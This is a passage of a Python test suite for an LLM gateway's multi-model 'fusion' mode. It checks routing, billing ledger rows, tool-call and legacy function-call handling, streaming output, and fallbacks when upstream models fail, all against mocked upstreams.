import asyncio
import httpx, json
from fastapi.testclient import TestClient
from gateway.app import create_app
from tests.helpers import DelayedByteStream, FakeClock

CFG = """
[budget]
active = "T"
[budgets.T]
[providers.p]
base_url = "https://example.invalid"
api_key_env = "P_KEY"
[models."a"]
provider = "p"
upstream_model = "a"
in_usd_per_mtok = 1.0
out_usd_per_mtok = 1.0
fallback = []
[models."b"]
provider = "p"
upstream_model = "b"
in_usd_per_mtok = 1.0
out_usd_per_mtok = 1.0
fallback = []
[fusion]
model = "fusion"
panel = ["a", "b"]
quorum = ["a", "b"]
reviewers = ["a", "b"]
fuser = "b"
review_max_tokens = 128
stage_timeout_s = 5
[policy]
version = "static-v0"
default_model = "fusion"
"""


def handler(req):
    body = json.loads(req.content)
    prompt = body["messages"][-1]["content"]
    if "VERDICT" in prompt:
        text = "VERDICT a correct ok\nVERDICT b correct ok"
    elif "Produce the single best final answer" in prompt:
        text = "FUSED ANSWER"
    else:
        text = "candidate answer"
    if body.get("stream"):
        chunk = {"choices": [{"index": 0, "delta": {"content": text},
                              "finish_reason": None}]}
        payload = (f"data: {json.dumps(chunk)}\n\n"
                   'data: {"choices":[],"usage":{"prompt_tokens":3,"completion_tokens":4}}\n\n'
                   "data: [DONE]\n\n")
        return httpx.Response(200, content=payload.encode(),
                              headers={"content-type": "text/event-stream"})
    return httpx.Response(200, json={
        "choices": [{"message": {"content": text}}],
        "usage": {"prompt_tokens": 3, "completion_tokens": 4}})


def make_client(tmp_path, monkeypatch, h=handler, cfg=CFG):
    monkeypatch.setenv("GATEWAY_TOKENS", "prism:tokA,admin:tokB")
    monkeypatch.setenv("P_KEY", "sk-p")
    p = tmp_path / "g.toml"
    p.write_text(cfg)
    app = create_app(p, tmp_path / "g.sqlite", clock=FakeClock(),
                     transports={"p": httpx.MockTransport(h)})
    return TestClient(app)


def H(tok="tokA"):
    return {"Authorization": f"Bearer {tok}"}


BODY = {"model": "auto", "messages": [{"role": "user", "content": "hi"}]}

# A cap calibrated (empirically, against this exact panel/fuser/mock shape --
# see the fix-round-1 section of task-5-report.md for the derivation) to let
# both candidates and both reviews settle -- 2.8e-05 actual -- while the
# fuser's OWN preflight estimate (~0.000206, dominated by build_fusion_prompt's
# longer text) pushes consumed over a cap of 0.00022. Too low and gather_panel
# itself trips first (already covered); too high (>= 0.000234) and nothing
# trips at all. max_tokens=1 on the request and a small review_max_tokens
# keep the candidate/review preflight ESTIMATES (as opposed to their actual
# settled cost) from swamping this budget before the fuser is ever reached.
BUDGET_CFG = """
[budget]
active = "T"
[budgets.T]
cap_usd = 0.00022
[providers.p]
base_url = "https://example.invalid"
api_key_env = "P_KEY"
[models."a"]
provider = "p"
upstream_model = "a"
in_usd_per_mtok = 1.0
out_usd_per_mtok = 1.0
fallback = []
[models."b"]
provider = "p"
upstream_model = "b"
in_usd_per_mtok = 1.0
out_usd_per_mtok = 1.0
fallback = []
[fusion]
model = "fusion"
panel = ["a", "b"]
quorum = ["a", "b"]
reviewers = ["a", "b"]
fuser = "b"
review_max_tokens = 5
stage_timeout_s = 5
[policy]
version = "static-v0"
default_model = "fusion"
"""

BUDGET_BODY = {"model": "auto", "messages": [{"role": "user", "content": "hi"}],
               "max_tokens": 1}


def test_auto_takes_the_fusion_path(tmp_path, monkeypatch):
    c = make_client(tmp_path, monkeypatch)
    r = c.post("/v1/chat/completions", json=BODY, headers=H())
    assert r.status_code == 200
    body = r.json()
    assert body["model"] == "fusion"
    assert body["choices"][0]["message"]["content"] == "FUSED ANSWER"
    assert body["fusion"]["path"] == "quorum"
    assert "x-fusion-trace-id" in r.headers


def test_naming_the_pseudo_model_explicitly_also_fuses(tmp_path, monkeypatch):
    c = make_client(tmp_path, monkeypatch)
    r = c.post("/v1/chat/completions", json={**BODY, "model": "fusion"}, headers=H())
    assert r.json()["fusion"]["path"] == "quorum"


def test_naming_a_real_model_takes_the_single_model_path(tmp_path, monkeypatch):
    c = make_client(tmp_path, monkeypatch)
    r = c.post("/v1/chat/completions", json={**BODY, "model": "a"}, headers=H())
    assert r.status_code == 200 and r.json()["model"] == "a"
    assert "fusion" not in r.json()


def test_fusion_writes_one_ledger_row_per_call_under_one_request_id(tmp_path, monkeypatch):
    c = make_client(tmp_path, monkeypatch)
    r = c.post("/v1/chat/completions", json=BODY, headers=H())
    rid = r.headers["x-fusion-trace-id"]
    st = c.get("/admin/status", headers=H("tokB")).json()
    assert st["ledger"]["consumed_usd"] > 0
    import sqlite3
    conn = sqlite3.connect(tmp_path / "g.sqlite")
    rows = conn.execute("SELECT model, state FROM ledger WHERE request_id=?",
                        (rid,)).fetchall()
    # 2 candidates + 2 reviews + 1 fuser
    assert len(rows) == 5
    assert not any(state == "preflight" for _, state in rows)


# -- Task 6: the M8 bypass is gone. A tool-calling request used to be routed
# AWAY from the panel because `_extract_text` dropped tool calls and a
# fully-billed panel then returned 502 (M8 final review, finding 1a).
# `Candidate` + `gateway/tool_vote.py` (Task 5's decision tree) fixed the
# root cause, so a tool-calling request now reaches the panel like anything
# else. The five tests below used to pin the bypass; they are rewritten to
# the new behaviour, but they still protect the invariant the bypass existed
# for: a tool request must never be billed for a panel and then handed a
# 5xx.

def _tool_call_response():
    """A `read` call -- read-only (in the default readonly_tools set), so an
    agreeing panel takes the cheap `tool_fast` path (no review, no fuser)
    rather than `tool_reviewed`."""
    return httpx.Response(200, json={
        "choices": [{"message": {"content": None, "tool_calls": [
            {"id": "call_1", "type": "function",
             "function": {"name": "read", "arguments": "{}"}}]},
                    "finish_reason": "tool_calls"}],
        "usage": {"prompt_tokens": 1, "completion_tokens": 1}})


def _ledger_row_count(tmp_path, request_id):
    import sqlite3
    conn = sqlite3.connect(tmp_path / "g.sqlite")
    return conn.execute(
        "SELECT COUNT(*) FROM ledger WHERE request_id=?", (request_id,)
    ).fetchone()[0]


# A 3-member panel (a, b quorum + s slow leg), needed to prove the exact
# ledger row count `tool_fast` produces: the two quorum candidates settle,
# and the cancelled slow leg must ALSO settle (usage_source="estimated")
# rather than vanish -- the money invariant says a cancelled call is
# settled, never failed, because the upstream did work. Task 5's review
# measured this as 3 rows, not 2 (an earlier draft of this plan said 2).
CFG_S = """
[budget]
active = "T"
[budgets.T]
[providers.p]
base_url = "https://example.invalid"
api_key_env = "P_KEY"
[models."a"]
provider = "p"
upstream_model = "a"
in_usd_per_mtok = 1.0
out_usd_per_mtok = 1.0
fallback = []
[models."b"]
provider = "p"
upstream_model = "b"
in_usd_per_mtok = 1.0
out_usd_per_mtok = 1.0
fallback = []
[models."s"]
provider = "p"
upstream_model = "s"
in_usd_per_mtok = 1.0
out_usd_per_mtok = 1.0
fallback = []
[fusion]
model = "fusion"
panel = ["a", "b", "s"]
quorum = ["a", "b"]
reviewers = ["a", "b"]
fuser = "b"
review_max_tokens = 128
stage_timeout_s = 5
[policy]
version = "static-v0"
default_model = "fusion"
"""


def _s_handler(make_response):
    """Wrap a canned response so model "s" (CFG_S's slow leg) sleeps past
    the point gather_panel's `tool_fast` branch cancels it -- so the
    cancellation these tests rely on is exercised for real, not just
    coincidentally missed because a synchronous mock resolves before
    `cancel(slow)` runs."""
    async def h(req):
        if json.loads(req.content).get("model") == "s":
            await asyncio.sleep(0.15)
        return make_response()
    return h


def test_a_tool_calling_request_now_reaches_the_fusion_panel(tmp_path, monkeypatch):
    # Was: asserted the request BYPASSED fusion (M8 finding 1a's mitigation).
    # Now the panel handles tool calls, so it must fuse -- while keeping the
    # invariant the old test protected: never billed-then-502.
    def h():
        return httpx.Response(200, json={
            "choices": [{"message": {"content": None, "tool_calls": [
                {"id": "c1", "type": "function",
                 "function": {"name": "read", "arguments": '{"path":"a.py"}'}}]}}],
            "usage": {"prompt_tokens": 3, "completion_tokens": 4}})
    c = make_client(tmp_path, monkeypatch, h=_s_handler(h), cfg=CFG_S)
    r = c.post("/v1/chat/completions", json={
        "model": "fusion", "messages": [{"role": "user", "content": "read a.py"}],
        "tools": [{"type": "function", "function": {"name": "read", "parameters": {}}}],
    }, headers=H())
    assert r.status_code == 200
    body = r.json()
    assert body["model"] == "fusion"                       # fused, not bypassed
    assert body["choices"][0]["finish_reason"] == "tool_calls"
    assert body["choices"][0]["message"]["tool_calls"][0]["function"]["name"] == "read"
    assert body["fusion"]["path"] == "tool_fast"
    # Exact row count for THIS branch. Note it is 3, not 2, on a 3-member
    # panel: the two quorum candidates plus the cancelled slow leg, which
    # must settle an 'estimated' row rather than vanish -- the money
    # invariant says a cancelled call is settled, never failed, because the
    # upstream did work.
    rid = r.headers["x-fusion-trace-id"]
    import sqlite3
    rows = sqlite3.connect(tmp_path / "g.sqlite").execute(
        "SELECT model, state, usage_source FROM ledger WHERE request_id=?",
        (rid,)).fetchall()
    assert len(rows) == 3
    assert sorted(st for _, st, _ in rows) == ["settled", "settled", "settled"]
    # ...and no review or fuser call happened: no model appears twice.
    assert len({m for m, _, _ in rows}) == 3
    # M9 Task 6 review round 1, minor: asserting `["settled"]*3` alone
    # passes identically whether "s" was genuinely cancelled or just
    # happened to finish normally -- it doesn't distinguish "cancellation
    # settles at the estimate" from "the slow leg answered like any other
    # candidate." Pin the row this test's own comment claims to prove:
    # "s" specifically must be settled with usage_source="estimated".
    assert ("s", "settled", "estimated") in rows


def test_tool_choice_alone_now_reaches_the_fusion_panel(tmp_path, monkeypatch):
    # tool_choice can be sent without a fresh `tools` list (e.g. a
    # multi-turn conversation that already established the tool set) --
    # either key alone must be enough to REACH the panel now, not just skip
    # it.
    c = make_client(tmp_path, monkeypatch, h=_s_handler(_tool_call_response), cfg=CFG_S)
    r = c.post("/v1/chat/completions",
              json={**BODY, "tool_choice": "auto"}, headers=H())
    assert r.status_code == 200
    body = r.json()
    assert body["model"] == "fusion"
    assert body["fusion"]["path"] == "tool_fast"
    assert body["choices"][0]["message"]["tool_calls"][0]["function"]["name"] == "read"
    # Same exact-row-count proof as the `tools` variant above.
    assert _ledger_row_count(tmp_path, r.headers["x-fusion-trace-id"]) == 3


# -- Re-review residual 1: the legacy OpenAI `functions`/`function_call`
# shape (deprecated but still accepted by real clients) must reach fusion
# too now. It does NOT get a tool-decided fast path, though: `_extract_
# message` (Task 3) only reads the modern `tool_calls` array, never the
# deprecated singular `function_call` field, so a panel answering
# exclusively in the legacy shape looks EMPTY to every candidate -- the same
# "zero usable candidates" shape a content-filtered refusal produces. That
# is not a regression Task 6 introduces: it degrades through the exact
# "zero candidates -> single-model chain fallback" rung finding 1b already
# built (see test_zero_usable_candidates_degrades_to_the_single_model_
# chain_not_502 below), which still returns the client's function_call
# payload untouched with status 200 -- never a 5xx, never silently dropped.
# Traced end to end against the real request lifecycle: 2 panel candidates
# (both billed despite contributing nothing usable) + 1 chain-fallback retry
# = 3 ledger rows, answered by model "a".

FUNCTIONS = [{"name": "read", "parameters": {"type": "object"}}]


def _legacy_function_call_response(model):
    return httpx.Response(200, json={
        "choices": [{"message": {"content": None, "function_call": {
            "name": "read", "arguments": "{}"}},
                    "finish_reason": "function_call"}],
        "usage": {"prompt_tokens": 1, "completion_tokens": 1}})


# M9 Task 6 review round 1, minor: these two were misnamed
# "..._now_reaches_the_fusion_panel" even though their own assertion is
# `model != "fusion"` -- what they actually pin is the degrade-to-chain
# behaviour, not a fusion. Renamed to match.

def test_legacy_functions_request_degrades_to_the_single_model_chain(tmp_path, monkeypatch):
    def h(req):
        return _legacy_function_call_response(json.loads(req.content).get("model"))
    c = make_client(tmp_path, monkeypatch, h=h)
    r = c.post("/v1/chat/completions",
              json={**BODY, "functions": FUNCTIONS}, headers=H())
    assert r.status_code == 200
    body = r.json()
    # Not "fusion" -- see the comment above: the legacy shape can't be
    # extracted into a Candidate, so the panel degrades to the single-model
    # chain rather than genuinely fusing. It still answers 200, though, and
    # the function_call payload survives untouched.
    assert body["model"] != "fusion"
    assert body["choices"][0]["message"]["function_call"]["name"] == "read"
    # Exact row count for THIS branch, proving the panel actually ran (a
    # bypass would have been 1 row) rather than silently short-circuiting.
    assert _ledger_row_count(tmp_path, r.headers["x-fusion-trace-id"]) == 3


def test_legacy_function_call_alone_degrades_to_the_single_model_chain(tmp_path, monkeypatch):
    def h(req):
        return _legacy_function_call_response(json.loads(req.content).get("model"))
    c = make_client(tmp_path, monkeypatch, h=h)
    r = c.post("/v1/chat/completions",
              json={**BODY, "function_call": "auto"}, headers=H())
    assert r.status_code == 200
    assert r.json()["model"] != "fusion"
    assert r.json()["choices"][0]["message"]["function_call"]["name"] == "read"
    assert _ledger_row_count(tmp_path, r.headers["x-fusion-trace-id"]) == 3


def test_streaming_legacy_function_call_degrades_to_the_single_model_chain(tmp_path, monkeypatch):
    # Streaming counterpart of the two tests above -- and the direct pin for
    # M9 Task 6 review round 1, finding 1 (CRITICAL)'s "legacy `functions`"
    # row: before the fix, the streaming generator had no equivalent of
    # `_finish_fusion`'s "< 2 candidates" -> "zero candidates -> chain
    # fallback" rungs at all, so this exact request reached the fuser (with
    # an empty candidate set) and the client got fuser-generated PROSE
    # instead of its `function_call`, after being billed for the whole
    # panel -- a strict regression from the pre-Task-6 bypass, which
    # answered this correctly (if only by accident, via the bypass this
    # milestone exists to remove).
    #
    # NOTE on row count: round 1 review asked for this to "still cost 1
    # row." Verified empirically (both before writing this test and via the
    # non-streaming twins above, which were not flagged) that 1 row is not
    # achievable now that the bypass is gone: `gather_panel` unconditionally
    # bills BOTH quorum candidates before the zero-usable-candidates rung is
    # even reached, so the floor is 2, and the chain fallback's own retry of
    # panel[0] adds a third. 3 rows is what "mirror... the same terminal
    # handling non-streaming uses" (the review's own fix instruction)
    # actually produces, and it is what keeps this path's cost identical to
    # its non-streaming twin above -- which the review did not flag as
    # wrong. Asserting 1 here would make this test fail against correct,
    # parity-preserving code.
    def h(req):
        body = json.loads(req.content)
        if body.get("stream") and body.get("model") == "b":
            # The fuser's own call (fuser = "b" in this CFG) -- reachable
            # ONLY if the empty-candidate rung was skipped (the pre-fix
            # bug). Answering it with a distinct, streaming PROSE shape
            # (rather than the same canned function_call bytes every other
            # call gets) is what lets this test actually catch a
            # reintroduced bug, instead of coincidentally finding the same
            # bytes forwarded either way -- a real gap the round 1 review
            # itself would have caught: with the original handler (every
            # call, streaming or not, answering the same function_call
            # JSON), a wrongly-issued fuser call's raw bytes get forwarded
            # to the client verbatim by the byte-passthrough streaming loop
            # and still contain "function_call", so a content-only
            # assertion can't tell "the fuser was never called" apart from
            # "the fuser was called and coincidentally echoed the same
            # bytes."
            payload = json.dumps({"choices": [{"index": 0,
                                               "delta": {"content": "PROSE FROM FUSER"},
                                               "finish_reason": None}]})
            sse = (f"data: {payload}\n\n"
                  'data: {"choices":[],"usage":{"prompt_tokens":1,"completion_tokens":1}}\n\n'
                  "data: [DONE]\n\n")
            return httpx.Response(200, content=sse.encode(),
                                  headers={"content-type": "text/event-stream"})
        return _legacy_function_call_response(body.get("model"))
    c = make_client(tmp_path, monkeypatch, h=h)
    with c.stream("POST", "/v1/chat/completions",
                  json={**BODY, "functions": FUNCTIONS, "stream": True}, headers=H()) as r:
        assert r.status_code == 200
        rid = r.headers["x-fusion-trace-id"]
        raw = b"".join(r.iter_bytes()).decode()
    # The client's function_call payload survives untouched -- not
    # replaced with fuser-generated prose.
    assert "PROSE FROM FUSER" not in raw
    assert "function_call" in raw and '"name":"read"' in raw.replace(" ", "")
    import sqlite3
    conn = sqlite3.connect(tmp_path / "g.sqlite")
    rows = conn.execute("SELECT model, state FROM ledger WHERE request_id=? ORDER BY id",
                        (rid,)).fetchall()
    # Exact row sequence: 2 panel candidates (both billed, neither usable)
    # + 1 chain-fallback retry of panel[0] ("a"). A third row naming "b"
    # (the configured fuser) instead of "a" would mean the fuser was
    # reached despite the empty candidate set -- the regression this test
    # exists to catch.
    assert rows == [("a", "settled"), ("b", "settled"), ("a", "settled")]


def test_streaming_tool_calling_request_now_reaches_the_fusion_panel(tmp_path, monkeypatch):
    # Mirrors the non-streaming test above for the streaming path: the panel
    # decides `tool_fast`, and the streaming generator's `decided`
    # short-circuit (Task 6 step 5) serves the synthesised tool-call chunk
    # stream WITHOUT ever calling the fuser -- the same 3-row cost as the
    # non-streaming path, not 3 + 1 for a fuser call that would just repeat
    # the already-decided answer in prose.
    def h():
        return httpx.Response(200, json={
            "choices": [{"message": {"content": None, "tool_calls": [
                {"id": "c1", "type": "function",
                 "function": {"name": "read", "arguments": '{"path":"a.py"}'}}]}}],
            "usage": {"prompt_tokens": 3, "completion_tokens": 4}})
    c = make_client(tmp_path, monkeypatch, h=_s_handler(h), cfg=CFG_S)
    with c.stream("POST", "/v1/chat/completions", json={
        "model": "fusion", "stream": True,
        "messages": [{"role": "user", "content": "read a.py"}],
        "tools": [{"type": "function", "function": {"name": "read", "parameters": {}}}],
    }, headers=H()) as r:
        assert r.status_code == 200
        rid = r.headers["x-fusion-trace-id"]
        raw = b"".join(r.iter_bytes()).decode()
    assert "stream_failed" not in raw and '"error"' not in raw
    assert raw.rstrip().endswith("data: [DONE]")
    objs = [json.loads(l[6:]) for l in raw.splitlines()
            if l.startswith("data: ") and l[6:].strip() != "[DONE]"]
    assert any(o["choices"][0]["delta"].get("tool_calls", [{}])[0]
               .get("function", {}).get("name") == "read" for o in objs)
    assert any(o["choices"][0].get("finish_reason") == "tool_calls" for o in objs)
    # Same exact-row-count proof as the non-streaming test: the fuser was
    # never called.
    assert _ledger_row_count(tmp_path, rid) == 3


def test_a_tool_request_with_no_survivors_gets_the_spec_sanctioned_502(tmp_path, monkeypatch):
    # The invariant the deleted bypass tests existed to protect -- but a 502
    # IS a 5xx, so "never 5xxs" (the name this test had) was itself wrong:
    # what must never happen is an UNHANDLED gateway 500 from a request
    # that was billed for a panel; the deliberate, spec-sanctioned
    # upstream_exhausted 502 below is exactly what "every failure has a
    # rung" means (M9 Task 6 review round 1, minor).
    c = make_client(tmp_path, monkeypatch, h=lambda req: httpx.Response(500, json={}))
    r = c.post("/v1/chat/completions", json={
        "model": "fusion", "messages": [{"role": "user", "content": "x"}],
        "tools": [{"type": "function", "function": {"name": "read", "parameters": {}}}],
    }, headers=H())
    assert r.status_code == 502 and r.json()["error"]["type"] == "upstream_exhausted"


def test_streaming_tool_call_is_a_valid_openai_chunk_stream(tmp_path, monkeypatch):
    def h(req):
        return httpx.Response(200, json={
            "choices": [{"message": {"content": None, "tool_calls": [
                {"id": "c1", "type": "function",
                 "function": {"name": "read", "arguments": '{"path":"a.py"}'}}]}}],
            "usage": {"prompt_tokens": 3, "completion_tokens": 4}})
    c = make_client(tmp_path, monkeypatch, h=h)
    with c.stream("POST", "/v1/chat/completions", json={
        "model": "fusion", "stream": True,
        "messages": [{"role": "user", "content": "read a.py"}],
        "tools": [{"type": "function", "function": {"name": "read", "parameters": {}}}],
    }, headers=H()) as r:
        raw = b"".join(r.iter_bytes()).decode()
    assert raw.rstrip().endswith("data: [DONE]")
    objs = [json.loads(l[6:]) for l in raw.splitlines()
            if l.startswith("data: ") and l[6:].strip() != "[DONE]"]
    assert any(c_["choices"][0]["delta"].get("tool_calls") for c_ in objs
               if c_.get("choices"))
    assert any(c_["choices"][0].get("finish_reason") == "tool_calls" for c_ in objs
               if c_.get("choices"))

    # M9 Task 6 review round 1, minor: spec acceptance criterion 9 requires
    # a real client to be able to decode this. Replay the exact bytes this
    # gateway produced through the real openai SDK (same technique as
    # test_streaming_fuser_mid_stream_error_does_not_glue_onto_a_truncated_
    # chunk below) and let ChatCompletionStreamState reconstruct the call
    # instead of hand-rolled chunk parsing.
    from openai import OpenAI
    client = OpenAI(api_key="x", base_url="http://test",
                    http_client=httpx.Client(transport=httpx.MockTransport(
                        lambda req: httpx.Response(200, content=raw.encode(),
                            headers={"content-type": "text/event-stream"}))))
    with client.chat.completions.stream(
            model="fusion", messages=[{"role": "user", "content": "read a.py"}]) as stream:
        for _ in stream:
            pass
        final = stream.get_final_completion()
    assert final.choices[0].finish_reason == "tool_calls"
    calls = final.choices[0].message.tool_calls
    assert len(calls) == 1
    assert calls[0].function.name == "read"
    assert json.loads(calls[0].function.arguments) == {"path": "a.py"}


# -- Final whole-branch review, finding 1b: "every candidate returned no
# usable text" used to degrade straight to a 502. Paying for a panel and
# then hard-failing is the worst outcome available -- fall through to the
# single-model chain instead.

def test_zero_usable_candidates_degrades_to_the_single_model_chain_not_502(tmp_path, monkeypatch):
    def h(req):
        # Every upstream call -- panel candidates AND the eventual
        # single-model retry -- answers 200 with unusable (null) content, a
        # refusal-shaped response with no extractable text.
        return httpx.Response(200, json={
            "choices": [{"message": {"content": None}, "finish_reason": "content_filter"}],
            "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
    c = make_client(tmp_path, monkeypatch, h=h)
    r = c.post("/v1/chat/completions", json=BODY, headers=H())
    assert r.status_code == 200          # not 502
    assert r.json()["model"] != "fusion"  # the single-model chain answered


def test_all_upstreams_down_returns_502_not_500(tmp_path, monkeypatch):
    c = make_client(tmp_path, monkeypatch, h=lambda req: httpx.Response(500, json={}))
    r = c.post("/v1/chat/completions", json=BODY, headers=H())
    assert r.status_code == 502 and r.json()["error"]["type"] == "upstream_exhausted"


def test_a_lone_survivor_is_returned_verbatim(tmp_path, monkeypatch):
    def h(req):
        body = json.loads(req.content)
        if body["model"] == "a":
            return httpx.Response(500, json={})
        prompt = body["messages"][-1]["content"]
        if "Produce the single best final answer" in prompt:
            return httpx.Response(500, json={})     # fuser also down
        return httpx.Response(200, json={
            "choices": [{"message": {"content": "only b"}}],
            "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
    c = make_client(tmp_path, monkeypatch, h=h)
    r = c.post("/v1/chat/completions", json=BODY, headers=H())
    assert r.status_code == 200
    assert r.json()["choices"][0]["message"]["content"] == "only b"
    assert r.json()["fusion"]["degraded"] is True
    rid = r.headers["x-fusion-trace-id"]
    import sqlite3
    conn = sqlite3.connect(tmp_path / "g.sqlite")
    rows = conn.execute("SELECT model FROM ledger WHERE request_id=?", (rid,)).fetchall()
    # Only the two candidate calls: fewer than 2 candidates means
    # _cross_review's own guard skips review entirely, and _finish_fusion's
    # "<2 candidates" rung returns the survivor WITHOUT ever calling the
    # fuser -- the 500 the mock above wires up for the fuser prompt is dead
    # code on this path. A row count of 2 is what tells "no fuser call was
    # made" apart from "the fuser was called and failed" (test below), which
    # would show up here as 3 rows instead.
    assert len(rows) == 2


def test_streaming_lone_survivor_holding_a_tool_call_is_returned_verbatim(tmp_path, monkeypatch):
    # Streaming twin of test_a_lone_survivor_is_returned_verbatim, but
    # holding a tool call rather than prose -- the exact shape M9 Task 6
    # review round 1, finding 1 (CRITICAL) measured. The streaming
    # generator used to special-case only the three TOOL_DECIDED_PATHS (a
    # `decided` flag checking `panel.path in TOOL_DECIDED_PATHS`), not
    # `_finish_fusion`'s broader "< 2 candidates" rung this test exercises:
    # a lone survivor from an ordinary quorum-member failure is NOT a
    # TOOL_DECIDED_PATH (panel.path == "full" here), so the old code fell
    # through to a fuser call the fuser being wired to 500 below would have
    # caught -- except the mock's own comment reveals the real bug is worse
    # than a 500: with `tools` now forwarded to it, a LIVE fuser answers
    # with prose, and the client gets that prose instead of its tool call,
    # fully billed. This is also the routine production shape: configs/
    # gateway.toml's quorum is 2 models and kimi-k3 is 403ing today, so one
    # quorum member down puts every streaming tool request through here.
    def h(req):
        body = json.loads(req.content)
        if body["model"] == "a":
            return httpx.Response(500, json={})
        prompt = body["messages"][-1]["content"]
        if "Produce the single best final answer" in prompt:
            # Dead code on this path -- if this ever answers, the fuser was
            # reached and the fix has regressed.
            return httpx.Response(200, json={
                "choices": [{"message": {"content": "PROSE FROM FUSER"}}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
        return httpx.Response(200, json={
            "choices": [{"message": {"content": None, "tool_calls": [
                {"id": "call_1", "type": "function",
                 "function": {"name": "read", "arguments": "{}"}}]}}],
            "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
    c = make_client(tmp_path, monkeypatch, h=h)
    with c.stream("POST", "/v1/chat/completions",
                  json={**BODY, "stream": True}, headers=H()) as r:
        assert r.status_code == 200
        rid = r.headers["x-fusion-trace-id"]
        raw = b"".join(r.iter_bytes()).decode()
    assert "PROSE FROM FUSER" not in raw
    assert raw.rstrip().endswith("data: [DONE]")
    objs = [json.loads(l[6:]) for l in raw.splitlines()
            if l.startswith("data: ") and l[6:].strip() != "[DONE]"]
    assert any(o["choices"][0]["delta"].get("tool_calls", [{}])[0]
               .get("function", {}).get("name") == "read" for o in objs)
    assert any(o["choices"][0].get("finish_reason") == "tool_calls" for o in objs)
    import sqlite3
    conn = sqlite3.connect(tmp_path / "g.sqlite")
    rows = conn.execute("SELECT model, state FROM ledger WHERE request_id=? ORDER BY id",
                        (rid,)).fetchall()
    # Same row count as the non-streaming twin above: "a" failed, "b"
    # settled, no fuser call. 3 rows would mean the fuser was reached.
    assert rows == [("a", "failed"), ("b", "settled")]


def test_a_dead_fuser_falls_back_to_the_best_candidate(tmp_path, monkeypatch):
    def h(req):
        body = json.loads(req.content)
        prompt = body["messages"][-1]["content"]
        if "Produce the single best final answer" in prompt:
            return httpx.Response(500, json={})
        if "VERDICT" in prompt:
            return httpx.Response(200, json={
                "choices": [{"message": {"content": "VERDICT a correct ok\nVERDICT b correct ok"}}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
        return httpx.Response(200, json={
            "choices": [{"message": {"content": f"answer from {body['model']}"}}],
            "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
    c = make_client(tmp_path, monkeypatch, h=h)
    r = c.post("/v1/chat/completions", json=BODY, headers=H())
    assert r.status_code == 200
    assert r.json()["choices"][0]["message"]["content"] == "answer from a"
    assert r.json()["fusion"]["degraded"] is True


def test_streaming_fusion_emits_keepalives_then_the_fuser_stream(tmp_path, monkeypatch):
    c = make_client(tmp_path, monkeypatch)
    with c.stream("POST", "/v1/chat/completions",
                  json={**BODY, "stream": True}, headers=H()) as r:
        assert r.status_code == 200
        raw = b"".join(r.iter_bytes()).decode()
    assert ": fusion" in raw                    # SSE comment keepalive
    assert "FUSED ANSWER" in raw
    assert raw.rstrip().endswith("data: [DONE]")
    # Every keepalive must be an SSE COMMENT, not a data line -- a data line
    # the client cannot parse as a chunk would break a conformant SDK.
    for line in raw.splitlines():
        if line.startswith(": "):
            continue
        if line.startswith("data: ") and line[6:].strip() != "[DONE]":
            json.loads(line[6:])       # must be valid JSON, or this raises


def test_streaming_fusion_settles_every_ledger_row_including_the_fuser(tmp_path, monkeypatch):
    """The fuser's row is the one call app.py bills by hand instead of
    through call_model -- confirm it actually reaches 'settled' and isn't
    quietly left stranded in 'preflight' by some future refactor."""
    c = make_client(tmp_path, monkeypatch)
    with c.stream("POST", "/v1/chat/completions",
                  json={**BODY, "stream": True}, headers=H()) as r:
        assert r.status_code == 200
        rid = r.headers["x-fusion-trace-id"]
        raw = b"".join(r.iter_bytes()).decode()
    assert "FUSED ANSWER" in raw
    import sqlite3
    conn = sqlite3.connect(tmp_path / "g.sqlite")
    rows = conn.execute(
        "SELECT model, state, usage_source FROM ledger WHERE request_id=? ORDER BY id",
        (rid,)).fetchall()
    assert len(rows) == 5                              # 2 candidates + 2 reviews + 1 fuser
    assert all(state == "settled" for _, state, _ in rows), rows
    # The fuser call specifically: 'reported' (not just 'settled') pins that
    # the explicit settle() in the happy path actually ran, rather than the
    # cancellation-safety-net's estimate quietly papering over a bug that
    # skipped it.
    assert rows[-1] == ("b", "settled", "reported")


def test_streaming_dead_fuser_falls_back_to_the_best_candidate(tmp_path, monkeypatch):
    """Mirrors test_a_dead_fuser_falls_back_to_the_best_candidate, but for
    the streaming path: the fuser 500s before its first byte, and the
    client -- which already has an open stream -- must get a valid chunk
    stream carrying the fallback answer, not an error chunk."""
    def h(req):
        body = json.loads(req.content)
        prompt = body["messages"][-1]["content"]
        if "Produce the single best final answer" in prompt:
            return httpx.Response(500, json={})
        if "VERDICT" in prompt:
            return httpx.Response(200, json={
                "choices": [{"message": {"content": "VERDICT a correct ok\nVERDICT b correct ok"}}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
        return httpx.Response(200, json={
            "choices": [{"message": {"content": f"answer from {body['model']}"}}],
            "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
    c = make_client(tmp_path, monkeypatch, h=h)
    with c.stream("POST", "/v1/chat/completions",
                  json={**BODY, "stream": True}, headers=H()) as r:
        assert r.status_code == 200
        raw = b"".join(r.iter_bytes()).decode()
    assert ": fusion fusing" in raw        # the panel succeeded before the fuser died
    assert raw.rstrip().endswith("data: [DONE]")
    contents = []
    for line in raw.splitlines():
        if line.startswith(": ") or not line.startswith("data: "):
            continue
        payload = line[6:].strip()
        if payload == "[DONE]":
            continue
        obj = json.loads(payload)
        assert "error" not in obj, f"fuser death leaked as an error chunk: {obj}"
        content = obj["choices"][0]["delta"].get("content")
        if content:
            contents.append(content)
    assert contents == ["answer from a"]


# -- M9 Task 3 review, finding 1 (Important, live at the Candidate-carrying-
# commit): _fuser_gave_nothing used to call _as_chunks(fallback[1].text,
# ...) unconditionally. A tool-calls-only Candidate has empty .text, so the
# client got a silent HTTP 200 with an empty content delta -- worse than the
# 502 this milestone exists to fix, since the panel is fully billed and the
# client is told it succeeded. The fix at the time (pre-Task-6, when this
# test was written) was to treat a tool-calls-only fallback as no usable
# fallback at all and 502 instead -- explicitly fenced off pending "Task 6
# builds a real tool-call chunk synthesiser." Task 6 IS that synthesiser:
# `_as_tool_chunks` now exists, so the fix is complete and the correct
# behaviour is to actually DELIVER the fallback, not keep rejecting it (see
# the `not fallback[1]` guard in `_fuser_gave_nothing`, gateway/app.py).
#
# The two candidates below deliberately DISAGREE (different tool names) so
# `decide_tools` cannot resolve the panel structurally into a
